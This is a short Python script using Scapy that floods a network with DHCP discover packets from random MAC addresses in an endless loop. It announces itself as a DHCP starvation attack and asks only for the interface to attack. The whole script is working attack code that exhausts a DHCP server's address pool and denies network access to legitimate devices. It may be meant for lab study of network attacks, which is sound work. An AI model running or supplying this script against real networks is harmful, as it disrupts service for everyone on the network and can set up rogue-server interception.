from scapy.all import *
# conf.checkIPaddr is set to False.
# Because we don't want to make sure that the address we send 
# traffic to is the address that is going to reply us back
conf.checkIPaddr = False


#crafting a packet
#Create DHCP discover with destination IP = broadcast
#Source MAC address is set to a random MAC
#Source IP address = 0.0.0.0
#Destination IP address = broadcast
#Source port = 68 (DHCP/BOOTP Client)
#Destination port = 67 (DHCP/BOOTP Server)
#Type of DHCP msg is "discover"

dhcp_discover = Ether (dst='ff:ff:ff:ff:ff:ff', src=RandMAC())  \
        / IP (src='0.0.0.0', dst='255.255.255.255')  \
        / UDP (sport=68,dport=67) \
        / BOOTP(op=1, chaddr=RandMAC()) \
        / DHCP(options=[('message-type', 'discover'),('end')])

interface = input("Enter interface name (eth0): ")
print("Initiating DHCP starvation attack...")
sendp(dhcp_discover, iface=interface, loop=1, verbose=1)
